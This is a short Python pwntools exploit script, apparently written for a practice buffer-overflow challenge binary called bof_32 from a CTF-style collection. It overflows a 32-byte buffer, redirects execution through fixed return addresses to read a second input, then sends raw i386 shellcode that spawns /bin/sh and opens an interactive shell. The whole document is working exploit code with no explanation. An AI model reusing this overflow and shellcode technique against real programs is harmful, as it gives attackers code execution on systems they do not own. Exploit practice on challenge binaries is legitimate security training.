from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/2_bof_32/bof_32")
pwn.gdb.attach(p)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7ffefefc\n')
payload = b"\x00" * 32
payload += p32(0x8049060) + p32(0x804c980) + p32(0x804c980)
payload += b"\n"
p.send(payload)
payload = b""
payload += b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
payload += b"\n"
p.send(payload)
p.interactive()
